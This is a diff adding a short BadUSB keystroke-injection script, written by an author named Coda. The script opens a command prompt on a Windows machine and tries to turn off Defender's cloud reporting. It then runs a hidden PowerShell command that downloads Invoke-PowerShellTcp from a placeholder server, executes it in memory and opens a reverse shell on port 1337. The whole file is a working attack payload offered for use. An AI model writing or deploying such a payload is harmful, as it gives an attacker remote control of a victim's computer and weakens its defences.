@@ -1,0 +1,17 @@
+REM A badkb script to connect a Windows computer back to my server running a netcat/pwncat listener, using the Invoke-PowerShellTcp script
+REM Author: Coda
+
+DELAY 800
+GUI r
+DELAY 650
+STRING cmd.exe
+DELAY 450
+ENTER
+DELAY 900
+STRING Set-MpPreference -MAPSReporting 0
+DELAY 500
+ENTER
+DELAY 700
+STRING powershell.exe -windowstyle hidden -nop -ep bypass -c iex ((New-Object Net.WebClient).DownloadString('http://0.0.0.0:80/Invoke-PowerShellTcp.ps1'));Invoke-PowerShellTcp -Reverse -IPAddress 0.0.0.0 -Port 1337
+DELAY 500
+ENTER
